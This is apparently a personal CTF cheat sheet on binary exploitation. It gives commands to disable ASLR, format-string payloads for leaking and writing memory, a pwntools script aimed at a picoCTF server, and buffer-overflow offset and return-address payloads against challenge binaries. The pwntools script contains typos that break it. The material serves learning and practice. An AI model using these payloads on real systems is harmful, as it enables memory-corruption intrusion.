---
title: Pwn
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: ""
  description: ""
  canonical: ""
  robots: ""
  noindex: false
---
- Disable ASLR :
```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

- Enable it again, run
```sh
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
## Format string

- Leak address : 
```sh
for i in $(seq 1 20); do ./ch5 %$i\$x;printf "\n";done
#or
./ch14 "$(python3 -c "print('%08x'+'_%08X'*30)")"
```

- Show the content on the stack  : 
```sh
for i in $(seq 1 20); do ./ch5 %$i\$x |rax2 -s |tr -cd "[:print:]" |rev;printf "\n";done
```

- See your input on the stack :
```sh
 ./ch14 AAAA$(python -c 'print "%08x."*20')
 ./ch35 $(python3 -c"print('\x41\x41\x41\x41'+'\x8c\x3f\x5e\xd1'+'%x'+'_%08x'* 300)")
#python -c 'print "aa" + "\x08\x04\xc0\x28"[::-1]'
```

- Show the hex value of the given arguments:
```sh
./ch14 'AAAA.%9$x
```
- Write memory : 
```sh
./ch14 $(python2 -c "print '\xb8\xfa\xff\xbf' + '\xba\xfa\xff\xbf' +'%48871x'+'%9\$hn'+'%8126x'+'%10\$hn'")
#We add an \ because of Bash...
```

- Automate Write memory :
```sh
from pwn import **

context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 53865)

# Function to send payload to target
def exec_fmt(payload): 
	p = remote('rhea.picoctf.net', 53865)
	p.sendline(payoad)
	return p.recvall()

autofmt = FmtStr(exec_fmt) # Create exploit automater
offset = autofmt.offset

# Key-value pairs for addresses and their final value after exploit
writes = {
	0x404060: 0x67616c66
}payload = fmtstr_payload(offset, writes)

flag = p.recvall()

print(flag)
print(payload)
```
## Buffer Overflow 

- Find the Offset :

```sh
pwn cyclic 150
pwn cyclic -l naafoaafp #bytes

gdb-peda$ pattern_create 200
gdb-peda$ pattern_offset A7AAMAAiA
```

`In 32 bits take the bytes that overflowed RIP ` 
`In 64 bits Grab the first 4 bytes of RSP`

- Overflow RIP ( 32bits ) :

```sh
(python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')";echo "cat passwd" ; cat) | ./ch35 
```

- Overflow RIP ( 64bits ) :

```sh
(python3 -c "print('\x41' * $i + '\x41\x41\x41\x41')"; cat) | ./ch35 
```

- Brute Force Offset : 
```sh
for i in $(seq 250 300); do

(python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')";echo "cat passwd" ; cat) | ./ch35; 

done
```

- Send payloads :
```sh
./chall "$(python3 -c "print('\xd8\xfa\xff\xbf'+'\x25\x6e')")"
./chall "$(echo -ne '\xd8\xfa\xff\xbf\x25\x6e')"
python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')" |./chall
```

Good Resource : 
https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow